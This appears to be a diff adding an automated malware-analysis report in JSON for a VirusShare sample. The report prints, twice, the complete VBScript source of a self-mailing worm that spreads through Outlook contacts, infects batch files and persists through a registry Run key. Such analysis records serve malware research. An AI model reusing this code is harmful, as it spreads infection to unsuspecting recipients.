@@ -1,0 +1,63 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "AUTOEXEC": "Runs when the Word document is opened",
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "On Error Resume Next\nDim FileSysObject, File\nSet FileSysObject = CreateObject (\"Scripting.FileSystemObject\")\nSet File = FileSysObject.GetFile(WScript.ScriptFullName)\nDim OutlookObject, OutMail, Index\nSet OutlookObject = CreateObject(\"Outlook.Application\")\nFor Index = 1 To 20\nSet OutMail = OutlookObject.CreateItem(0)\nOutMail.to = OutlookObject.GetNameSpace(\"MAPI\").AddressLists(1).AddressEntries(Index)\nOutMail.Subject = \"hello\"\nOutMail.Body = \"it is my foto... with love!\"\nOutMail.Attachments.Add(WScript.ScriptFullName)\nOutMail.Send\nSet batvir = CreateObject(\"Scripting.FileSystemObject\")\nset bat =batvir.CreateTextFile(\"C:\\start.bat\") \nbat.WriteLine \"@echo off\"\nbat.WriteLine\"set sity=bat\"\nbat.WriteLine \"for %%b in (*.sity) do if not %%b==AUTOEXEC.BAT copy %0 %%b>nul\"\nbat.WriteLine \"echo on\"\nbat.Close\nSet WSHShell = WScript.CreateObject(\"WScript.Shell\")\nWSHShell.RegWrite\"HKLM\\Software\\Microsoft\\Windows\\Current Version\\Run\\avp.0\",\"C:\\start.bat\", \"REG_SZ\"\nNext "
+    },
+    "filename": "VirusShare_417143d742381db2757ee23661d4868f",
+    "filesize": 992,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "417143d742381db2757ee23661d4868f",
+        "sha1": "826d6c09ca08912f4ffcef9a0b9e2bfffc555fb9",
+        "sha256": "dc3af9f7658d06ea416e29ee00adfa3c67cf46e5b77824bb63ce9f137e473a06"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On Error Resume Next",
+            "Dim FileSysObject, File",
+            "Set FileSysObject = CreateObject (\"Scripting.FileSystemObject\")",
+            "Set File = FileSysObject.GetFile(WScript.ScriptFullName)",
+            "Dim OutlookObject, OutMail, Index",
+            "Set OutlookObject = CreateObject(\"Outlook.Application\")",
+            "For Index = 1 To 20",
+            "Set OutMail = OutlookObject.CreateItem(0)",
+            "OutMail.to = OutlookObject.GetNameSpace(\"MAPI\").AddressLists(1).AddressEntries(Index)",
+            "OutMail.Subject = \"hello\"",
+            "OutMail.Body = \"it is my foto... with love!\"",
+            "OutMail.Attachments.Add(WScript.ScriptFullName)",
+            "OutMail.Send",
+            "Set batvir = CreateObject(\"Scripting.FileSystemObject\")",
+            "set bat =batvir.CreateTextFile(\"C:\\start.bat\") ",
+            "bat.WriteLine \"@echo off\"",
+            "bat.WriteLine\"set sity=bat\"",
+            "bat.WriteLine \"for %%b in (*.sity) do if not %%b==AUTOEXEC.BAT copy %0 %%b>nul\"",
+            "bat.WriteLine \"echo on\"",
+            "bat.Close",
+            "Set WSHShell = WScript.CreateObject(\"WScript.Shell\")",
+            "WSHShell.RegWrite\"HKLM\\Software\\Microsoft\\Windows\\Current Version\\Run\\avp.0\",\"C:\\start.bat\", \"REG_SZ\"",
+            "Next "
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.280368",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
